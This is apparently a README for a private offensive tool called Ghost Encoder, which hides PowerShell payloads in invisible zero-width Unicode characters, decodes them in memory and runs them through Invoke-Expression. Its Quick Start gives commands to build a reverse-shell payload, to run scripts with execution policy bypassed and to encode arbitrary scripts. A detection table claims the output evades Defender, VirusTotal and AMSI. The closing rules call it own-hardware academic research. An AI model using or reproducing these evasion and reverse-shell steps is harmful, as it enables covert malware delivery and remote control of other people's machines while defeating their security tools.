# GHOST ENCODER

```
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║  ███╗███████║██║   ██║███████╗   ██║
██║   ██║██╔══██║██║   ██║╚════██║   ██║
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
```

**22DIV // george wu // Unicode Steganographic Payload Delivery**

> *"What you can't see CAN hurt you."*

---

### Classification

```
CLASSIFICATION:  PRIVATE // DO NOT PUBLISH
OPERATOR:        VADER (george wu / 22DIV)
ORIGIN:          Israeli cyber operations — observed and reimplemented
TARGET:          Own hardware ONLY
```

### What This Is

Encodes arbitrary payloads into zero-width Unicode characters. The output
file appears **completely blank** in text editors. VirusTotal returns 0
detections. PowerShell `cat` shows `???????`. When executed, the invisible
payload is decoded in memory and run.

### Quick Start

```bash
# Test payload (harmless proof-of-concept)
python ghost_encode.py --test -o ghost_test.ps1
powershell -ep bypass -f ghost_test.ps1

# Reverse shell
python ghost_encode.py --shell 192.168.1.96 4444 -o ghost_shell.ps1

# Encode any PowerShell script
python ghost_encode.py myscript.ps1 -o ghost.ps1

# Full test suite (includes Defender scan)
python ghost_test.py

# Verify a ghost file decodes correctly
python ghost_encode.py --verify ghost.ps1
```

### How It Works

1. **16 zero-width Unicode characters** form a hex alphabet (0-F)
2. Each payload byte → 2 invisible chars (high nibble + low nibble)
3. Tiny visible decoder stub reconstructs payload in memory
4. `Invoke-Expression` executes the decoded payload
5. Payload never exists as readable file on disk

### Detection Profile

| Layer | Detects? | With dark_room? |
|---|---|---|
| Defender static | NO | — |
| VirusTotal | NO | — |
| AMSI runtime | MAYBE | NO |
| ETW logging | YES | NO |

### Full Documentation

See `GHOST_RESEARCH.md` — complete analysis including theory, detection
surface, integration with VADER kill chain, and defensive recommendations.

### Rules of Engagement

1. Own hardware only
2. Private repo — never public
3. CSEC academic research
4. Generated .ps1 files never committed
5. Respect the source

---

*Built from observation. Documented with respect.*
